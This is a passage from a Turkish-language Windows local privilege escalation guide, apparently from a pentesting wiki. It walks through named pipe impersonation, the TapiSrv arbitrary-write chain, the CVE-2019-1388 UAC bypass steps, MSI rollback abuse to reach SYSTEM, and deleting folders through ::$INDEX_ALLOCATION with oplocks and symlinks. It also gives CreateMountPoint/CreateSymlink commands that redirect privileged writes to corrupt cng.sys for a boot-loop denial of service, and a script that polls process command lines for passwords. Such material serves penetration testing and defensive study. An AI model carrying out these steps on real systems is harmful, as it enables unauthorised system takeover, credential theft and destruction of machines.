[**Farklı izin düzeyleriyle devralınan process ve thread'lerin (yalnızca full access değil) diğer açık handle'larının nasıl test edilip abuse edileceğine dair daha kapsamlı bir açıklama için bu diğer yazıyı okuyun.**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipes** olarak adlandırılan shared memory segment'leri, process iletişimini ve veri aktarımını sağlar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğini üstlenebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **privileged process** bulmak, kurduğunuz pipe ile etkileşime girdiğinde o process'in kimliğini benimseyerek **daha yüksek privileges elde etme** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme talimatları için [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) faydalı kılavuzlar bulabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini intercept etmenizi sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç privesc bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servisi (TapiSrv), server modunda `\\pipe\\tapsrv`'yi (MS-TRP) kullanıma açar. Remote authenticated bir client, mailslot tabanlı async event yolunu abuse ederek `ClientAttach`'i, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya rastgele **4-byte write** yapacak şekilde kullanabilir; ardından Telephony admin hakları elde edip servis olarak rastgele bir DLL yükleyebilir. İşleyişin tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir path olarak ayarlayarak `ClientAttach` çağrısı yapın → servis dosyayı `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event write'ları için kullanır.
- Her event, `Initialize` içindeki saldırgan kontrollü `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın; ardından deterministik write'ları tekrarlamak için kaydı kaldırın/kapatın.
- Kendinizi `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` bölümüne ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için rastgele bir DLL path'iyle `GetUIDllName` çağrısı yapın.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta çalıştırılabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute abuse

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown link'leri, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyerek saldırgan kontrollü dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları izleme**

Bir kullanıcı olarak shell aldığınızda, **command line üzerinden credentials aktaran** scheduled task'ler veya çalışan başka process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktı olarak verir.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Process'lerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC atlatma

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir process'i çalıştırmak mümkündür.

Bu sayede aynı vulnerability ile hem ayrıcalıkları yükseltmek hem de UAC'yi atlatmak mümkündür. Ayrıca herhangi bir şey yüklemek gerekmez ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosyalara ve bilgilere aşağıdaki GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junction'ları

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını buraya yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp bir NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web üzerinden sunulan bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmetinin kimliğiyle çalışabilir. Bu, uygulamaya özgü bir keyfi yazma sınırıdır; yazılabilir bir upload dizininin veya mevcut bir junction'ın varlığı tek başına bunu kanıtlamaz.

Upload işleyicisindeki tam yol oluşturma mantığını ve zamanlamayı, kullanıcının alt dizin üzerindeki etkin silme/oluşturma izinlerini, hedefin etkin ACL'lerini, yazma işlemini yapan bileşenin reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan ve web sunucusu süreçlerinin kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak işleyicinin davranışını veya ileride gerçekleşebilecek bir junction değişimini ortaya koyamaz. Çalıştırma bir hizmet hesabı altında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ı** inceleyin.

## Keyfi Klasör Silme/Taşıma/Yeniden Adlandırmadan SYSTEM EoP'ye

[**Bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan ve exploit kodu [**burada bulunan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) teknik.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı temel olarak, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak bir **kötü amaçlı MSI installer** oluşturması gerekir. Windows Installer daha sonra bu klasörü, rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiş olan diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanır.

Özetlenen teknik şöyledir:

1. **Aşama 1 – Ele Geçirme İçin Hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Yönetici olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yükleme sonrasında dosya için açık bir **handle** tutun.

- Adım 2: Kaldırma işlemini başlatın
    - Aynı `.msi` dosyasını kaldırın.
    - Kaldırma işlemi dosyaları `C:\Config.Msi` klasörüne taşımaya ve onları `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` hâline geldiğini saptamak için açık dosya **handle'ını `GetFinalPathNameByHandle` ile yoklayın**.

- Adım 3: Özel senkronizasyon
    - `.msi`, şu işlemleri yapan bir **özel kaldırma eylemi (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığı zamanı bildirir.
        - Ardından kaldırma işlemine devam etmeden önce başka bir olayı bekler.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Bildirim geldiğinde `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın**; bu, dosyanın **silinmesini engeller**.
    - Ardından kaldırma işleminin tamamlanabilmesi için karşı tarafa **sinyal gönderin**.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını elle silin (saldırgan olarak).
    - Artık **`C:\Config.Msi` boştur** ve ele geçirilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM düzeyindeki keyfi klasör silme açığını** tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` klasörünü zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` ile açık bir **handle** tutun.

- Adım 7: Başka bir yükleme çalıştırın
    - `.msi` dosyasını şu değerlerle yeniden yükleyin:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu hata tetikleyen bir değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` klasörünü izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronizasyon yapın
    - `.msi`, şu işlemleri yapan bir **özel yükleme eylemi (`SyncBeforeRollback`)** içerir:
        - `.rbs` dosyası oluşturulduğunda bir olaya sinyal gönderir.
        - Ardından devam etmeden önce bekler.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` olayı alındıktan sonra:
        - Windows Installer, `C:\Config.Msi` klasörüne **yeniden güçlü ACL'ler uygular**.
        - Ancak `WRITE_DAC` ile bir handle hâlâ sizde olduğundan, **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken denetlenir**; bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasının üzerine, Windows'a şunları yaptıran **sahte bir rollback script'i** yazın:
        - `.rbf` dosyanızı (kötü amaçlı DLL) ayrıcalıklı bir konuma (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini sağlayın.
    - **Kötü amaçlı SYSTEM düzeyinde bir payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback'i tetikleyin
    - Installer'ın devam etmesi için senkronizasyon olayına sinyal gönderin.
    - **Type 19 özel eylemi (`ErrorOut`)**, yüklemeyi bilinen bir noktada **kasten başarısız kılacak** şekilde yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM DLL'inizi yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir konumda kötü amaçlı DLL'iniz** bulunur.

- Son Adım: SYSTEM kodunu çalıştırın
    - Ele geçirdiğiniz DLL'i yükleyen, güvenilir ve **otomatik yükseltilen bir binary** (ör. `osk.exe`) çalıştırın.
    - **İşte**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Keyfi Dosya Silme/Taşıma/Yeniden Adlandırmadan SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki) **tüm klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya açığınız yalnızca **keyfi dosya silmeye** izin veriyorsa?

**NTFS iç işleyişinden** yararlanabilirsiniz: her klasörün şu adla anılan gizli bir alternate data stream'i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **indeks meta verilerini** depolar.

Dolayısıyla, bir klasörün `::$INDEX_ALLOCATION` stream'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu şu gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* silme API’si çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP’ye
Primitive’iniz rastgele dosyaları/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa ne olur?

1. Adım 1: Bir yem klasörü ve dosya oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Ayrıcalıklı bir işlem `file1.txt` dosyasını silmeye çalıştığında **oplock yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM process'ini tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback'inin içinde – silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i zamanından önce serbest bırakır.

- Seçenek B: `folder1` klasörünü **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: \RPC Control içinde bir **symlink** oluştur:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS iç akışını hedefler — bunu silmek klasörü siler.

5. Step 5: Oplock'u serbest bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak artık junction + symlink nedeniyle aslında silinen şudur:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive'i exploit edin — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows driver'ının** adıyla bir **klasör** (dosya değil) oluşturun. Örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- Bunu **önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek driver'ı yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümlenemediği için yükleyemez** ve **çöker veya açılışı durdurur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma mümkün değildir**.

### Privileged log/backup yollarından ve OM symlink'lerinden rastgele dosya üzerine yazma / boot DoS'a

Bir **privileged service**, **writable config** dosyasından okuduğu bir yola log/export yazdığında, privileged yazma işlemini rastgele bir dosyanın üzerine yazmaya dönüştürmek için **Object Manager symlinks + NTFS mount points** ile bu yolu yönlendirin (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu içeren config dosyası saldırgan tarafından yazılabilir olmalıdır (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna mount point ve bir OM file symlink oluşturabilme imkânı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan privileged bir işlem (log, export, report).

**Örnek zincir**
1. Privileged log hedefini belirlemek için config dosyasını okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'ın log'u yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, privileged bir service'in yazma amacıyla açacağı tüm korumalı dosyalara uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` yolundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce o denenebilir ve bozuk veriler için güvenilir bir DoS hedefi oluşturur.



## **Yüksek Bütünlükten SYSTEM'e**

### **Yeni service**

Zaten High Integrity düzeyinde bir process çalıştırıyorsanız, **yeni bir service oluşturup çalıştırarak SYSTEM'e giden yolu** kolayca elde edebilirsiniz:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process içinden **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak reverse shell **yüklemeyi** deneyebilirsiniz.\
İlgili registry key'leri ve bir _.msi_ paketi yükleme hakkında [daha fazla bilgiye buradan ulaşabilirsiniz.](#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığından System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulursunuz), SeDebug ayrıcalığıyla **neredeyse tüm process'leri** (korumalı process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **herhangi bir process oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan bir process'i seçmek için kullanılır** (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri de bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir kod** [**örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` ile privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazmak için bir service oluşturmayı veya kötüye kullanmayı** içerir. Ardından, **`SeImpersonate`** ayrıcalığını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service'in) token'ını **impersonate** ederek SYSTEM ayrıcalıklarını elde edebilir.\
[**Name pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipe'ları kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'yi **hijack** etmeyi başarırsanız, o process'in izinleriyle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **yazma izinlerine** sahip olacağından, bunu **high integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında** [**daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tam ayrıcalıklara

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edilir.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edilir.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde dener**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host üzerinde enumeration yapar (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C#'a aktarılmış sürümü**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable). Önerilmez. Win10'da düzgün çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da düzgün çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderi temel alınarak oluşturulmuş araç (düzgün çalışması için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows'ta Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows'ta Yetki Yükseltme - Bir cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni trend (Rob Fuller ve Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Kapsamlı OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows Yetki Yükseltme Kontrol Listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows'ta Yetki Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA makrosuyla phishing → hMailServer kimlik bilgilerini çözme → SYSTEM'e yükselmek için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token'ı çalma](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Bağlantı: Windows'ta Symbolic Link'leri Kötüye Kullanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
